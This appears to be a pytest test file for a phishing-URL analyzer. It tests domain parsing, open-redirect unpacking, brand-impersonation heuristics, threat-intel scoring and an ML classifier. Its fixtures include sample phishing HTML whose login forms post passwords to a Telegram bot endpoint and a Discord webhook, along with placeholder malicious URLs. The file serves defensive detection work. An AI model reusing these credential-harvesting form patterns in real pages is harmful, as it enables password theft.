import pytest
from unittest.mock import patch, MagicMock
from services.url_analyzer import (
    url_analyzer,
    extract_domain_parts,
    get_base_domain,
    unpack_open_redirect,
    detect_brand_in_path_or_subdomain,
    lookup_threat_intel,
)
from services.dynamic_analyzer import _inspect_html, _get_base_domain, _get_tag_attr_str
from services.local_model import local_phishing_classifier


class TestPublicSuffixListParsing:
    """Test PSL integration accurately parses multi-part domains and private suffixes."""

    def test_complex_tlds(self):
        # .co.za
        sub, dom, suf, reg = extract_domain_parts("https://sub.domain.co.za/path")
        assert sub == "sub"
        assert dom == "domain"
        assert suf == "co.za"
        assert reg == "domain.co.za"
        assert get_base_domain("sub.domain.co.za") == "domain.co.za"

        # .com.au
        sub, dom, suf, reg = extract_domain_parts("portal.service.com.au")
        assert dom == "service"
        assert suf == "com.au"
        assert reg == "service.com.au"

        # .gov.in
        sub, dom, suf, reg = extract_domain_parts("https://uidai.gov.in")
        assert dom == "uidai"
        assert suf == "gov.in"
        assert reg == "uidai.gov.in"

    def test_private_psl_domains(self):
        # pages.dev (Cloudflare Pages)
        sub, dom, suf, reg = extract_domain_parts("https://my-phish-app.pages.dev/login")
        assert reg == "my-phish-app.pages.dev"
        assert get_base_domain("my-phish-app.pages.dev") == "my-phish-app.pages.dev"

        # github.io
        sub, dom, suf, reg = extract_domain_parts("https://attacker.github.io/payload")
        assert reg == "attacker.github.io"
        assert get_base_domain("attacker.github.io") == "attacker.github.io"

    def test_ip_and_standard_domains(self):
        # Standard .com
        assert get_base_domain("www.google.com") == "google.com"

        # IP host
        assert get_base_domain("192.168.1.1") == "192.168.1.1"

        # Dynamic analyzer get_base_domain
        assert _get_base_domain("sub.domain.co.za") == "domain.co.za"
        assert _get_base_domain("test.pages.dev") == "test.pages.dev"


class TestOpenRedirectUnpacking:
    """Test detection of open redirect parameters on trusted and untrusted hosts."""

    def test_open_redirect_detection_on_trusted_host(self):
        url = "https://www.google.com/url?q=http://malicious-login-paypal.xyz/signin"
        result = unpack_open_redirect(url)
        assert result["is_open_redirect"] is True
        assert result["param"] == "q"
        assert "malicious-login-paypal.xyz" in result["target_host"]
        assert result["target_url"] == "http://malicious-login-paypal.xyz/signin"

    def test_open_redirect_various_params(self):
        url1 = "https://example.com/redirect?dest=https://phishing-site.tk/verify"
        assert unpack_open_redirect(url1)["is_open_redirect"] is True

        url2 = "https://portal.net/login?next=https://attacker-stealer.xyz/auth"
        assert unpack_open_redirect(url2)["is_open_redirect"] is True

    def test_normal_queries_not_flagged(self):
        normal_url = "https://www.google.com/search?q=machine+learning+cybersecurity"
        assert unpack_open_redirect(normal_url)["is_open_redirect"] is False

        same_domain = "https://example.com/login?redirect=https://example.com/dashboard"
        assert unpack_open_redirect(same_domain)["is_open_redirect"] is False


class TestBrandInPathAndSubdomain:
    """AlwaysVerify Layer 1: Test brand-in-path and brand-in-subdomain heuristics."""

    def test_brand_in_path_detection(self):
        # Brand in path on unrelated domain
        url = "https://storage.cloud.example/paypal/verification.html"
        detected, brand, location = detect_brand_in_path_or_subdomain(url)
        assert detected is True
        assert brand == "paypal"
        assert location == "path"

    def test_brand_in_subdomain_detection(self):
        # Brand in subdomain on unrelated domain
        url = "https://paypal.secure-verification-center.com/signin"
        detected, brand, location = detect_brand_in_path_or_subdomain(url)
        assert detected is True
        assert brand == "paypal"
        assert location == "subdomain"

    def test_authentic_domains_not_flagged(self):
        # Authentic brand domains should never be flagged
        assert detect_brand_in_path_or_subdomain("https://www.paypal.com/signin")[0] is False
        assert detect_brand_in_path_or_subdomain("https://accounts.google.com/login")[0] is False
        assert detect_brand_in_path_or_subdomain("https://login.microsoftonline.com/auth")[0] is False
        assert detect_brand_in_path_or_subdomain("https://www.binance.com/en/login")[0] is False


class TestExfiltrationSinkDetection:
    """Test dynamic runtime analyzer detection of credential drop services."""

    def test_telegram_bot_sink(self):
        html = """
        <html><body>
        <form action="https://api.telegram.org/bot123456789:ABCdef/sendMessage" method="POST">
            <input type="text" name="username" />
            <input type="password" name="password" />
            <button type="submit">Sign In</button>
        </form>
        </body></html>
        """
        page = _inspect_html(html, "https://secure-login-portal.net")
        assert "api.telegram.org" in page["exfiltration_sinks"]
        assert page["has_password_field"] == 1
        assert page["has_submit_button"] == 1

    def test_discord_webhook_sink(self):
        html = """
        <html><body>
        <form action="https://discord.com/api/webhooks/123456/abcdef" method="POST">
            <input type="password" name="pwd" />
        </form>
        </body></html>
        """
        page = _inspect_html(html, "https://free-crypto-giveaway.tk")
        assert "discord.com/api/webhooks" in page["exfiltration_sinks"]

    def test_meta_refresh_and_attribute_value_list(self):
        from bs4 import BeautifulSoup
        from bs4.element import AttributeValueList

        html = """
        <html>
        <head>
            <meta http-equiv="refresh" content="5; url=https://evil-phishing.com/login">
        </head>
        <body></body>
        </html>
        """
        page = _inspect_html(html, "https://benign-site.com")
        assert "https://evil-phishing.com/login" in page["meta_refresh_targets"]

        # Simulate AttributeValueList on meta tag attributes (the error reported)
        soup = BeautifulSoup(html, "html.parser")
        meta = soup.find("meta")
        meta["content"] = AttributeValueList(["5;", "url=https://evil-phishing.com/login"])
        meta["http-equiv"] = AttributeValueList(["refresh"])

        assert _get_tag_attr_str(meta, "content") == "5; url=https://evil-phishing.com/login"
        assert _get_tag_attr_str(meta, "http-equiv") == "refresh"


class TestThreatIntelligenceAndRDAP:
    """Test URLhaus and RDAP domain age threat scoring."""

    @patch("services.url_analyzer.lookup_urlhaus")
    @patch("services.url_analyzer.lookup_rdap_domain_age")
    def test_urlhaus_hit(self, mock_rdap, mock_urlhaus):
        mock_urlhaus.return_value = {"matched": True, "threat": "malware_download", "url_status": "online"}
        mock_rdap.return_value = 100

        res = lookup_threat_intel("http://malicious-urlhaus-sample.xyz/dropper.exe")
        assert res["matched"] is True
        assert res["urlhaus_hit"] is True
        assert res["score_boost"] >= 40
        assert "abuse.ch_urlhaus" in res["sources"]

    @patch("services.url_analyzer.lookup_urlhaus")
    @patch("services.url_analyzer.lookup_rdap_domain_age")
    def test_nrd_under_14_days(self, mock_rdap, mock_urlhaus):
        mock_urlhaus.return_value = {"matched": False}
        mock_rdap.return_value = 5  # 5 days old

        res = lookup_threat_intel("http://brand-new-phishing-domain.xyz")
        assert res["matched"] is True
        assert res["domain_age_days"] == 5
        assert res["score_boost"] >= 30
        assert "rdap_domain_age" in res["sources"]

    @patch("services.url_analyzer.lookup_urlhaus")
    @patch("services.url_analyzer.lookup_rdap_domain_age")
    def test_young_domain_under_30_days(self, mock_rdap, mock_urlhaus):
        mock_urlhaus.return_value = {"matched": False}
        mock_rdap.return_value = 22  # 22 days old

        res = lookup_threat_intel("http://young-phishing-site.com")
        assert res["domain_age_days"] == 22
        assert res["score_boost"] >= 15


class TestLocalMLEnsembleFallback:
    """Test local scikit-learn ensemble model fallback."""

    def test_local_model_inference(self):
        features = {
            "url_length": 120,
            "num_dots": 5,
            "is_https": 0,
            "has_ip": 1,
            "num_subdomains": 4,
            "suspicious_tld": 1,
            "brand_impersonation": 1,
            "brand_in_path": 1,
            "open_redirect_detected": 1,
        }
        res = local_phishing_classifier.predict(features)
        assert res["available"] is True
        assert res["model_source"] == "local_ml_ensemble"
        assert res["prediction"] == 1
        assert res["score"] >= 70
        assert res["confidence"] >= 0.70

    def test_local_model_legit_sample(self):
        features = {
            "url_length": 25,
            "num_dots": 1,
            "is_https": 1,
            "has_ip": 0,
            "num_subdomains": 0,
            "suspicious_tld": 0,
            "brand_impersonation": 0,
            "brand_in_path": 0,
            "open_redirect_detected": 0,
        }
        res = local_phishing_classifier.predict(features)
        assert res["available"] is True
        assert res["score"] < 40


class TestScanUrlPipeline:
    """End-to-end integration scan tests."""

    @patch("services.url_analyzer.analyze_runtime_url")
    @patch("services.url_analyzer.call_hf_ml_service")
    def test_open_redirect_bypasses_trusted_dampening(self, mock_hf, mock_dynamic):
        mock_hf.return_value = {"available": False, "error": "Not configured"}
        mock_dynamic.return_value = {
            "available": True,
            "status": "available",
            "dynamic_score": 0,
            "flags": [],
            "page": {},
            "screenshot": {"available": False},
        }

        # Google open redirect pointing to a phishing link
        scan_res = url_analyzer.scan_url("https://www.google.com/url?q=http://malicious-login-paypal.xyz/signin")
        
        # Must NOT be dampened to <= 30 (Safe)
        assert scan_res["score"] >= 45
        assert scan_res["verdict"] in ["Suspicious", "Phishing"]
        assert scan_res["feature_summary"]["open_redirect_detected"] == 1
        assert any("Open redirect" in f for f in scan_res["flags"])
        assert scan_res["analysis_details"]["model_source"] == "local_ml_ensemble"

    @patch("services.url_analyzer.validate_scan_target", return_value=(True, None))
    @patch("services.url_analyzer.analyze_runtime_url")
    @patch("services.url_analyzer.call_hf_ml_service")
    def test_brand_in_path_scan(self, mock_hf, mock_dynamic, mock_validate):
        mock_hf.return_value = {"available": False, "error": "Not configured"}
        mock_dynamic.return_value = {
            "available": True,
            "status": "available",
            "dynamic_score": 0,
            "flags": [],
            "page": {},
            "screenshot": {"available": False},
        }

        scan_res = url_analyzer.scan_url("https://storage.cloud.example/paypal/verification.html")
        assert scan_res["feature_summary"]["brand_in_path"] == 1
        assert any("Brand name in path" in f for f in scan_res["flags"])
